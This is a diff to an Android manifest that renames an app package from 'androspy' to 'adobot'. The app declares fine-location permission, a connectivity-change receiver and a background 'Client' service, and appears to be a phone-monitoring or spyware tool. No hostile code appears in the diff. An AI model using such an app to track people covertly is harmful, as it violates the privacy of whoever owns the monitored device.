@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="buddy.ap.com.androspy">
+    package="buddy.ap.com.adobot">
 
     <uses-permission
         android:name="android.permission.ACCESS_FINE_LOCATION"
@@ -40,19 +40,19 @@
         android:supportsRtl="true"
         android:theme="@style/AppTheme">
         <activity
-            android:name=".MainActivity"
+            android:name="buddy.ap.com.adobot.MainActivity"
             android:noHistory="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
-        <receiver android:name="buddy.ap.com.androspy.NetworkWatcher">
+        <receiver android:name="buddy.ap.com.adobot.NetworkWatcher">
             <intent-filter>
                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
             </intent-filter>
         </receiver>
-        <service android:name=".Client" />
+        <service android:name="buddy.ap.com.adobot.Client" />
     </application>
 
 </manifest>
